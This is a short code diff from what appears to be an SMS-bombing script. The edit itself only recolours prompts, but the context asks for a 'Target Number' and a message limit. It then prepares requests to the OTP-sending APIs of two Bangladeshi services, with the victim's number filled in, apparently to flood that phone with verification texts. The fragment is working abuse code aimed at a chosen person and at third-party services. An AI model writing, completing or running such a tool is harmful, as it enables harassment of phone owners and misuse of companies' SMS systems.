@@ -41,8 +41,8 @@ logo = f"""
 """
 os.system("clear")
 print(logo)
-Number = input(f"{LIGHT_BLUE}Enter Your Target Number : ")
-amount = int(input("ENTER YOUR LIMIT : "))
+Number = input(f"{LIGHT_BLUE}Enter Your Target Number :{GREEN} {end}")
+amount = int(input(f"{YELLOW}ENTER YOUR LIMIT :{GREEN} {end}"))
 url1 = 'https://api.osudpotro.com/api/v1/users/send_otp'
 data1 = {"mobile": f"+88-{Number}", "deviceToken": "web", "language": "en", "os": "web"}
 url2 = 'https://api.osudkini.com/api/otp/generate-otp'
